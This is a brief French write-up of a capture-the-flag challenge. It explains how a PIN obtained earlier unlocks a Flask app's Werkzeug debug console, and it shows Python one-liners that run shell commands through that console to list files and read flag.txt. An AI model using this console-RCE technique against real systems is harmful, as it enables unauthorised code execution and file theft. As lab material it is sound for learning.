Suite du challenge "POST This Money", il vous faut le résoudre avant de pouvoir faire celui-ci

ATTENTION: PAS BESOIN ET INTERDICTION D'UTILISER DES OUTILS DE SCAN/FUZZING (nmap, ffuf, gobuster, dirb, etc). Leur utilisation risque de vous faire bannir temporairement du challenge !

Le flag est dans le fichier flag.txt
http://intro.ctfrei.fr:6002/ 

--------------------------------------

A la fin du challenge POST This money on obtient un code PIN.

Le nom du challenge avec "Flask" et la PIN nous ammène sur la piste d'une potentiel consol de debug Werkzeug. 

On va dans /console. On entre le PIN.

Et on obtient une RCE :

```
__import__('os').popen('ls').read();
__import__('os').popen('cat flag.txt').read();
CTFREI{le-flag}
```
